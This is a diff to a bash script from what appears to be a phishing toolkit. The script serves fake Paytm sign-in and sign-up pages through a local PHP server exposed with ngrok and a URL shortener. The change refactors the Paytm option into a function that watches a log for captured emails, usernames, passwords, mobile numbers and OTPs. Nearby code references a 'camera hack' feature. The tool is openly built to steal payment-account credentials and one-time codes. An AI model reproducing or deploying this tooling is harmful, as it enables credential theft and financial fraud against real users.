@@ -311,6 +311,21 @@ function main() {
         launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 0.1;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
 }
 
+#Paytm
+
+function paytm() {
+          printf "\n${red}[${white} 1 ${red}]${green} Sign In \n\n" 
+          printf "${red}[${white} 2 ${red}]${green} Sign Up \n\n"                           
+          read -p $'\e[1;31m>>>\e[1;92m Enter Your Choice : \e[0m' option1			  
+          if [ $option1 = 1 ] || [ $option1 = 01 ]; then	           
+		   cd paytm/ && main
+                   tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"			              	
+	  else	           
+                   cd signup/ && main
+		   tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
+	  fi
+}
+
 #CAMERA HACK
 function camera_hack() {	
         clear && printf "\n\n"
@@ -454,17 +469,7 @@ banner(){
                 break;		
 			  
         elif [ $option = 07 ] || [ $option = 7 ];then		
-                cd $phish/Paytm-Phishing/ && printf "\n"
-                printf "${red}[${white} 1 ${red}]${green} Sign In \n\n" 
-                printf "${red}[${white} 2 ${red}]${green} Sign Up \n\n"                           
-                read -p $'\e[1;31m>>>\e[1;92m Enter Your Choice : \e[0m' option1			  
-		if [ $option1 = 1 ] || [ $option1 = 01 ];then			
-			cd paytm/ && main
-                        tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"			              	
-		else
-                        cd signup/ && main
-			tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
-		fi
+                cd $phish/Paytm-Phishing/ && paytm            
 		break;
 			
         elif [ $option = 08 ] || [ $option = 8 ];then		
